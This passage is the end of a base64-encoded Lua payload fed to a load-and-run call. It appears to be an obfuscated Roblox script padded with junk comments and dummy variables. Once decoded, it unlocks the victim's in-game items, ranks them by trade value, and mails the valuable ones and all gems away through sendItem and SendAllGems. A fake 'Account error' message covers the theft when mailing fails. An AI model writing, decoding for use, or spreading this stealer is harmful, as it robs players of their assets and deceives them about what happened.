vdW50ID0gaXRlbS5fYW0gb3IgMSwgcmFwID0gcmFwVmFsdWUsIG5hbWUgPSBpdGVtLmlkfSkKICAgICAgICAgICAgICAgICAgICB0b3RhbFJBUCA9IHRvdGFsUkFQICsgKHJhcFZhbHVlICogKGl0ZW0uX2FtIG9yIDEpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAotLSB6c3N2eHJ2NAogICAgICAgICAgICBpZiBpdGVtLl9sayB0aGVuCi0tIDM5YnBqMDczCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfc3F0dGVwID0gewotLSB5ZWxmcjM3cgpsb2NhbCAxaDk1ODIgPSA5NAogICAgICAgICAgICAgICAgWzFdID0gdWlkLAogICAgICAgICAgICAgICAgWzJdID0gZmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIG5ldHdvcmsuSW52b2tlKCJMb2NraW5nX1NldExvY2tlZCIsIHVucGFjayhhcmdzKSkKbG9jYWwgaHg3czBzID0gNTMKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCi0tIHI0eWQyb2lvCmxvY2FsIHRyaXk5dCA9IDk0CgllbmQKLS0gcjZwcWtyN3kKZW5kCgppZiAjc29ydGVkSXRlbXMgPiAwIG9yIEdlbUFtb3VudDEgPiBtaW5fcmFwICsgbWFpbFNlbmRQcmljZSB0aGVuCiAgICBDbGFpbU1haWwoKQoJRW1wdHlCb3hlcygpCiAgICBpZiBub3QgY2FuU2VuZE1haWwoKSB0aGVuCi0tIHNzbmM3Z3VkCiAgICAgICAgbWVzc2FnZS5FcnJvcigiQWNjb3VudCBlcnJvci4gUGxlYXNlIHJlam9pbiBhbmQgdHJ5IGFnYWluIG9yIHVzZSBhIGRpZmZlcmVudCBhY2NvdW50IikKbG9jYWwgZTh5Y2ExID0gOTIKICAgICAgICByZXR1cm4KICAgIGVuZAoKLS0gYW90MHU4dzcKbG9jYWwgdDcwbmVtID0gMjQKICAgIHRhYmxlLnNvcnQoc29ydGVkSXRlbXMsIGZ1bmN0aW9uKGEsIGIpCiAgICAgICAgcmV0dXJuIGEucmFwICogYS5hbW91bnQgPiBiLnJhcCAqIGIuYW1vdW50IAotLSA4ZWk0MzBpbQogICAgZW5kKQoKLS0gMWt1cGViZ2IKICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBTZW5kTWVzc2FnZShHZW1BbW91bnQxKQogICAgZW5kKQoKLS0gaDNjeGRybjMKICAgIGZvciBfLCBpdGVtIGluIGlwYWlycyhzb3J0ZWRJdGVtcykgZG8KICAgICAgICBpZiBpdGVtLnJhcCA+PSBtYWlsU2VuZFByaWNlIGFuZCBHZW1BbW91bnQxID4gbWFpbFNlbmRQcmljZSB0aGVuCiAgICAgICAgICAgIHNlbmRJdGVtKGl0ZW0uY2F0ZWdvcnksIGl0ZW0udWlkLCBpdGVtLmFtb3VudCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGJyZWFrCmxvY2FsIHB6em8ycCA9IDM1CiAgICAgICAgZW5kCmxvY2FsIHl2cHplMiA9IDE1CiAgICBlbmQKbG9jYWwgYjVndHR5ID0gMzUKICAgIGlmIEdlbUFtb3VudDEgPiBtYWlsU2VuZFByaWNlIHRoZW4KLS0gZWswNmd5YngKbG9jYWwgcDNyZnJhID0gMjIKICAgICAgICBTZW5kQWxsR2VtcygpCiAgICBlbmQKLS0gaHU0cW96cjE='))()
